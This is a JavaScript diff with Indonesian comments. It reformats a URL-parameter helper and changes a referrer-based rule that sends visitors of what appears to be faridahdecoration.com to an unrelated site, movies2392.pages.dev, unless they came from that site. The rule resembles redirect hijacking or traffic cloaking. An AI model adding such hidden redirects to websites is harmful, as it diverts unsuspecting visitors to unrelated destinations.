@@ -22,33 +22,31 @@
     // Memanggil fungsi untuk memulai animasi progress bar
     animateProgressBar();
 
-// Fungsi untuk mendapatkan parameter dari URL
-function getParameterByName(name, url) {
-    if (!url) url = window.location.href;
-    name = name.replace(/[\[\]]/g, "\\$&");
-    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-        results = regex.exec(url);
-    if (!results) return null;
-    if (!results[2]) return '';
-    return decodeURIComponent(results[2].replace(/\+/g, " "));
-}
+ // Fungsi untuk mendapatkan parameter dari URL
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
 
-// Mendapatkan nilai parameter 'fbclid' dari URL
-var fbclid = getParameterByName('fbclid');
+    // Mengambil nilai parameter 'fbclid' dari URL
+    var fbclid = getParameterByName('fbclid');
 
-// Mendapatkan domain utama (tanpa protokol)
-var mainDomain = window.location.hostname.split('.').slice(-2).join('.');
+    // Mengambil domain utama (tanpa protokol)
+    var mainDomain = window.location.hostname.split('.').slice(-2).join('.');
 
-// Menentukan apakah pengguna datang dari Facebook atau tidak
-var dariFacebook = fbclid !== null;
-
-// Memeriksa apakah referrer berasal dari movies2392.pages.dev atau apakah pengguna berada di domain utama atau datang dari Facebook
-if (document.referrer.includes("movies2392.pages.dev") || window.location.hostname === mainDomain || dariFacebook) {
-    // Tidak melakukan redirect, biarkan pengguna tetap di situs
-} else {
-    // Redirect ke movies2392.pages.dev
-    window.location.href = "https://movies2392.pages.dev";
-}
+    // Jika pengunjung akses langsung atau hasilnya dari redirect dari https://movies2392.pages.dev,
+    // maka tidak ada redirect, biarkan web https://www.faridahdecoration.com terbuka
+    if (document.referrer.includes("movies2392.pages.dev") || window.location.hostname === mainDomain) {
+        // Tidak melakukan redirect
+    } else {
+        // Redirect ke https://movies2392.pages.dev
+        window.location.href = "https://movies2392.pages.dev";
+    }
 
 function redirectToURL() {
     window.location.href = 'https://crm.faridahdecoration.com/';
